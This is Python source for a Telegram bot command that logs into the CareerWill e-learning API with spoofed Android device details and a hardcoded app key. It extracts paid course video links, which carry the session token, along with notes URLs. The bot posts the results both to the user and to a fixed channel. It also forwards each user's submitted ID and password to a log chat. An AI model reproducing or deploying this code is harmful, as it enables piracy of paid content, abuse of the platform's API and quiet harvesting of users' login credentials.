import os
import requests
import threading
import asyncio
import cloudscraper
import time
from pyromod import listen
from pyrogram import Client
from pyrogram import filters
from pyrogram.types import Message
from config import CHANNEL_ID, CHANNEL_ID2, THUMB_URL,BOT_TEXT
from Extractor import app
from Extractor.core.utils import forward_to_log


requests = cloudscraper.create_scraper()
ACCOUNT_ID = "6206459123001"
bc_url = f"https://edge.api.brightcove.com/playback/v1/accounts/{ACCOUNT_ID}/videos/"


# Download thumbnail
def download_thumbnail(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            # Save in temp directory
            thumb_path = "thumb_temp.jpg"
            with open(thumb_path, "wb") as f:
                f.write(response.content)
            return thumb_path
        return None
    except Exception:
        return None

# -------------------- Downloader Function ---------------------
async def careerdl(app, message, headers, raw_text2, token, raw_text3, prog, name):
    num_id = raw_text3.split('&')
    result_text = ""
    total_videos = 0
    total_notes = 0
    total_topics = len(num_id)
    current_topic = 0
    start_time = time.time()

    # Download thumbnail at start
    thumb_path = download_thumbnail(THUMB_URL)

    for id_text in num_id:
        try:
            current_topic += 1
            details_url = f"https://elearn.crwilladmin.com/api/v9/batch-detail/{raw_text2}?topicId={id_text}"
            response = requests.get(details_url, headers=headers)
            data = response.json()
            classes = data["data"]["class_list"]["classes"]
            classes.reverse()
            
            # Get topic name
            topic_url = f"https://elearn.crwilladmin.com/api/v9/batch-topic/{raw_text2}?type=class"
            topic_data = requests.get(topic_url, headers=headers).json()["data"]
            topics = topic_data["batch_topic"]
            current_topic_name = next((topic["topicName"] for topic in topics if str(topic["id"]) == id_text), "Unknown Topic")

            # Calculate time metrics
            elapsed_time = time.time() - start_time
            avg_time_per_topic = elapsed_time / current_topic
            remaining_topics = total_topics - current_topic
            eta = avg_time_per_topic * remaining_topics
            
            # Format times
            elapsed_str = f"{int(elapsed_time//60)}m {int(elapsed_time%60)}s"
            eta_str = f"{int(eta//60)}m {int(eta%60)}s"

            # Update progress message
            progress_msg = (
                "🔄 <b>Processing Large Batch</b>\n"
                f"├─ Subject: {current_topic}/{total_topics}\n"
                f"├─ Name: <code>{current_topic_name}</code>\n"
                f"├─ Topics: {current_topic}/{total_topics}\n"
                f"├─ Links: {total_videos + total_notes}\n"
                f"├─ Time: {elapsed_str}\n"
                f"└─ ETA: {eta_str}"
            )
            await prog.edit_text(progress_msg)

            for video_data in classes:
                vid_id = video_data['id']
                lesson_name = video_data['lessonName']
                lesson_ext = video_data['lessonExt']

                detail_url = f"https://elearn.crwilladmin.com/api/v9/class-detail/{vid_id}"
                lesson_url = requests.get(detail_url, headers=headers).json()['data']['class_detail']['lessonUrl']

                if lesson_ext == 'brightcove':
                    video_link = f"{bc_url}{lesson_url}/master.m3u8?bcov_auth={token}"
                    total_videos += 1
                elif lesson_ext == 'youtube':
                    video_link = f"https://www.youtube.com/embed/{lesson_url}"
                    total_videos += 1
                else:
                    continue

                result_text += f"{lesson_name}: {video_link}\n"

            # Notes
            notes_url = f"https://elearn.crwilladmin.com/api/v9/batch-topic/{raw_text2}?type=notes"
            notes_resp = requests.get(notes_url, headers=headers).json()
            if 'data' in notes_resp and 'batch_topic' in notes_resp['data']:
                for topic in notes_resp['data']['batch_topic']:
                    topic_id = topic['id']
                    notes_topic_url = f"https://elearn.crwilladmin.com/api/v9/batch-notes/{raw_text2}?topicId={topic_id}"
                    notes_data = requests.get(notes_topic_url, headers=headers).json()

                    for note in reversed(notes_data.get('data', {}).get('notesDetails', [])):
                        doc_title = note.get('docTitle', '')
                        doc_url = note.get('docUrl', '').replace(' ', '%20')
                        line = f"{doc_title}: {doc_url}\n"
                        if line not in result_text:
                            result_text += line
                            total_notes += 1

        except Exception as e:
            error_msg = (
                "❌ <b>An error occurred during extraction</b>\n\n"
                f"Error details: <code>{str(e)}</code>\n\n"
                "Please try again or contact support."
            )
            await message.reply(error_msg)

    file_name = f"{name.replace('/', '')}.txt"
    with open(file_name, 'w', encoding='utf-8') as f:
        f.write(result_text)

    import datetime
    current_date = datetime.datetime.now().strftime("%Y-%m-%d")
    
    caption = (
        "🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
        "📱 <b>APP:</b> CareerWill\n"
        f"📚 <b>BATCH:</b> {name}\n"
        f"📅 <b>DATE:</b> {current_date} IST\n\n"
        "📊 <b>CONTENT STATS</b>\n"
        f"├─ 🎬 Videos: {total_videos}\n"
        f"├─ 📄 PDFs/Notes: {total_notes}\n"
        f"└─ 📦 Total Links: {total_videos + total_notes}\n\n"
        f"🚀 <b>Extracted by:</b> @{(await app.get_me()).username}\n\n"
        f"<code>╾───• {BOT_TEXT} •───╼</code>"
    )

    try:
        # Send to user with thumbnail
        await app.send_document(
            message.chat.id,
            document=file_name,
            caption=caption,
            thumb=thumb_path if thumb_path else None
        )
        
        # Send to channel with thumbnail
        await app.send_document(
            CHANNEL_ID,
            document=file_name,
            caption=caption,
            thumb=thumb_path if thumb_path else None
        )
    finally:
        # Cleanup
        await prog.delete()
        os.remove(file_name)
        if thumb_path and os.path.exists(thumb_path):
            os.remove(thumb_path)

# -------------------- Main Command Handler ---------------------
@app.on_message(filters.command("ugcw") & filters.private)
async def career_will(app: Client, message: Message):
    try:
        welcome_msg = (
            "🔹 <b>C--W EXTRACTOR</b> 🔹\n\n"
            "Send <b>ID & Password</b> in this format: <code>ID*Password</code>\n\n"
            "<b>Example:</b>\n"
            "- ID*Pass: <code>6969696969*password123</code>\n"
            "- Token: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code>"
        )
        input1 = await app.ask(message.chat.id, welcome_msg)
        await forward_to_log(input1, "Careerwill Extractor")
        raw_text = input1.text.strip()

        if "*" in raw_text:
            email, password = raw_text.split("*")
            headers = {
                "Host": "elearn.crwilladmin.com",
                "appver": "107",
                "apptype": "android",
                "cwkey": "+HwN3zs4tPU0p8BpOG5ZlXIU6MaWQmnMHXMJLLFcJ5m4kWqLXGLpsp8+2ydtILXy",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
            data = {
                "deviceType": "android",
                "password": password,
                "deviceModel": "Xiaomi M2007J20CI",
                "deviceVersion": "Q(Android 10.0)",
                "email": email,
                "deviceIMEI": "d57adbd8a7b8u9i9",
                "deviceToken": "fake_device_token"
            }

            login_url = "https://elearn.crwilladmin.com/api/v9/login-other"
            response = requests.post(login_url, headers=headers, json=data)
            token = response.json()["data"]["token"]
            success_msg = (
                "✅ <b>CareerWill Login Successful</b>\n\n"
                f"🆔 <b>Credentials:</b> <code>{email}*{password}</code>"
            )
            await message.reply_text(success_msg)
        else:
            token = raw_text

        # Fetch Batches
        headers = {
            "Host": "elearn.crwilladmin.com",
            "appver": "107",
            "apptype": "android",
            "usertype": "2",
            "token": token,
            "cwkey": "+HwN3zs4tPU0p8BpOG5ZlXIU6MaWQmnMHXMJLLFcJ5m4kWqLXGLpsp8+2ydtILXy",
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.2"
        }

        batch_url = "https://elearn.crwilladmin.com/api/v9/my-batch"
        response = requests.get(batch_url, headers=headers)
        
        batches = response.json()["data"]["batchData"]
        msg = "📚 <b>Available Batches</b>\n\n"
        for b in batches:
            msg += f"<code>{b['id']}</code> - <b>{b['batchName']}</b>\n"

        await message.reply_text(msg)
        input2 = await app.ask(message.chat.id, "<b>Send the Batch ID to download:</b>")
        raw_text2 = input2.text.strip()

        # Fetch Topics
        topic_url = f"https://elearn.crwilladmin.com/api/v9/batch-topic/{raw_text2}?type=class"
        topic_data = requests.get(topic_url, headers=headers).json()["data"]
        topics = topic_data["batch_topic"]
        batch_name = topic_data["batch_detail"]["name"]
        id_list = ""

        topic_list = "📑 <b>Available Topics</b>\n\n"
        for topic in topics:
            topic_list += f"<code>{topic['id']}</code> - <b>{topic['topicName']}</b>\n"
            id_list += f"{topic['id']}&"

        await message.reply_text(topic_list)
        input3 = await app.ask(message.chat.id, 
            "📝 <b>Send topic IDs to download</b>\n\n"
            f"Format: <code>1&2&3</code>\n"
            f"All Topics: <code>{id_list}</code>"
        )
        raw_text3 = input3.text.strip()

        prog = await message.reply(
            "🔄 <b>Processing Content</b>\n\n"
            "├─ Status: Extracting content\n"
            "└─ Please wait..."
        )
        threading.Thread(target=lambda: asyncio.run(careerdl(app, message, headers, raw_text2, token, raw_text3, prog, batch_name))).start()

    except Exception as e:
        error_msg = (
            "❌ <b>An error occurred</b>\n\n"
            f"Error details: <code>{str(e)}</code>\n\n"
            "Please try again or contact support."
        )
        await message.reply(error_msg)


